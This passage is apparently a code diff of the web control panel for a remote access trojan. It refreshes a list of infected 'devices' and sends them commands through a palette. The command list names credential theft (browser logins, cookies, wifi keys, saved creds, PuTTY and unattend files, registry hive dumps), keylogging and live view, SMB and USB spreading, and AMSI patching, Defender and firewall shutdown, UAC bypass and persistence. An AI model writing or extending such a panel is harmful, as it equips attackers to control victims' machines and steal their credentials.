+    await Promise.all(["devices","tasks","results","keylog","live","net","queue"].map(n=>fbDel(n+"/"+id)));
+    delete DEV[id];
+  }
+  render(); toast("purged "+dead.length,"ok");
 }
 
 /* ---------- palette ---------- */
-const CMDLIST=[["exec","shell command"],["ps","powershell"],["shot","screenshot"],["cam","webcam"],
- ["ls","list files"],["dl","download"],["info","system info"],["proc","processes"],["users","local users"],
- ["inst","installed software"],["net","netstat"],["tasks","scheduled tasks"],["drv","drivers"],
- ["lan","arp table"],["scan","scan subnet"],["smb","share list"],["spread","spread over smb"],
- ["usb","spread to usb"],["hives","dump hives"],["pass","browser logins"],["cookies","cookies"],
- ["wifi","wifi keys"],["cmdkey","saved creds"],["keylog","keylogger"],["live","live view"],
- ["amsi","patch amsi"],["defoff","defender off"],["fwoff","firewall off"],["uac","uac bypass"],
- ["rdp","enable rdp"],["httpd","open http port"],["persist","reinstall"],["heal","self heal"],
+const CMDL=[["exec","shell"],["ps","powershell"],["shot","screenshot"],["ls","files"],
+ ["dl","download"],["read","read text file"],["write","write file"],["info","system info"],
+ ["proc","processes"],["users","users"],["inst","software"],["net","netstat"],["tasks","tasks"],
+ ["drv","drivers"],["env","environment"],["vm","vm check"],["lan","arp"],["scan","scan subnet"],
+ ["smb","shares"],["spread","spread smb"],["usb","spread usb"],["hives","dump hives"],
+ ["pass","browser logins"],["cookies","cookies"],["wifi","wifi"],["cmdkey","saved creds"],
+ ["putty","putty"],["unattend","unattend"],["keylog","keylogger"],["live","live view"],
+ ["amsi","amsi"],["defoff","defender off"],["fwoff","fw off"],["uac","uac"],
+ ["rdp","enable rdp"],["httpd","open http port"],["persist","reinstall"],["heal","heal"],
  ["lock","lock"],["monoff","monitor off"],["power","reboot"],["uninst","uninstall"]];
 function palette(){ $("#pal").classList.add("on"); $("#pq").value=""; fillP(); $("#pq").focus() }
 function closeP(){ $("#pal").classList.remove("on") }
 function fillP(){
   const f=$("#pq").value.toLowerCase();
   $("#palist").innerHTML="";
-  CMDLIST.filter(([c,d])=>!f||c.includes(f)||d.includes(f)).slice(0,14).forEach(([c,d])=>{
-    const el=document.createElement("div"); el.innerHTML=`<b style="color:var(--ac)">${c}</b> — ${d}`;
-    el.onclick=()=>{ closeP(); runQuick(c) }; $("#palist").appendChild(el);
+  CMDL.filter(([c,d])=>!f||c.includes(f)||d.includes(f)).slice(0,14).forEach(([c,d])=>{
+    const el=document.createElement("div");
+    el.innerHTML=`<b style="color:var(--ac)">${c}</b> · ${d}`;
+    el.onclick=()=>{ closeP(); runQuick(c) };
+    $("#palist").appendChild(el);
   });
 }
 function runQuick(c){
-  const map={exec:()=>exec(),ls:()=>ls(),live:()=>{$$("#tabs button").find(b=>b.dataset.k==="liv").click()},
-    httpd:()=>directConnect()};
-  if(map[c]) return map[c]();
+  const m={exec:()=>exec(),ls:()=>ls(),live:()=>tabJump("liv"),httpd:()=>openPort()};
+  if(m[c]) return m[c]();
   send(c);
 }
 
-$$(".chip").forEach(c=>c.onclick=()=>{$$(".chip").forEach(x=>x.classList.remove("on"));c.classList.add("on");FIL=c.dataset.f;render()});
-$("#search").oninput=e=>{Q=e.target.value.toLowerCase();render()};
+/* ---------- shell ---------- */
+function railToggle(force){
+  const r=$("#rail");
+  const open = force===undefined ? !r.classList.contains("open") : force;
+  r.classList.toggle("open",open);
+}
+$$(".chip").forEach(c=>c.onclick=()=>{ $$(".chip").forEach(x=>x.classList.remove("on")); c.classList.add("on"); FIL=c.dataset.f; render() });
+$("#search").oninput=e=>{ Q=e.target.value.toLowerCase(); render() };
 document.addEventListener("keydown",e=>{
-  if(e.ctrlKey&&e.key==="k"){e.preventDefault();palette()}
-  if(e.key==="Escape"){closeP();closeM()}
-  if(e.ctrlKey&&e.key==="Enter"&&tabOn()==="con")exec();
+  if(e.ctrlKey&&e.key==="k"){ e.preventDefault(); palette() }
+  if(e.key==="Escape"){ closeP(); closeM(); railToggle(false) }
+  if(e.ctrlKey&&e.key==="Enter"&&tabOn()==="con") exec();
 });
 
-async function tick(){ DEV=await getF("devices")||{}; render(); if(cur)hdr(); if(tabOn()==="key")loadK() }
-(async()=>{ await tick(); setInterval(tick,5000);
-  const l=localStorage.getItem("last"); if(l&&DEV[l]) openD(l) })();
+async function tick(){
+  const d=await fbGet("devices")||{};
+  DEV={...d,...manual};
+  render(); if(cur) hdr(); if(tabOn()==="key") loadK();
+  if(MODE==="direct"&&DBASE&&cur&&!manual[cur]&&(Date.now()/1000-(DEV[cur]?.last||0)>60)){
+    $("#link").className="dir"; $("#link").textContent="stale";
+  }
+}
+(async()=>{
+  paintMode(); await tick(); setInterval(tick,5000);
+  const l=localStorage.getItem("last");
+  if(l&&DEV[l]) openD(l);
+})();
 </script></body></html>
